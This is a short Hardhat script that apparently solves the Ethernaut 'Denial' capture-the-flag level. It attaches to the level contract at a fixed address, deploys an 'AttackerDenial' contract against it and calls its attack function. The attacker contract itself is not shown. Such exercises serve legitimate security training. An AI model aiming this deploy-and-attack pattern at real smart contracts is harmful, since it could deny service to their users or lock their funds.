const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0xb8b87c6D2B5A9ea52B666119a2b4CE6D4363BF9a";
    contractName = "Denial";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    console.log(`Level at address ${levelAddress}`);
    const Attacker = await hre.ethers.getContractFactory(`Attacker${contractName}`);
    const attacker = await Attacker.deploy(levelAddress);
    console.log(`Attacker at ${attacker.address}`);

    
    tx = await attacker.attack();
    tr = await tx.wait();
    

    
    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
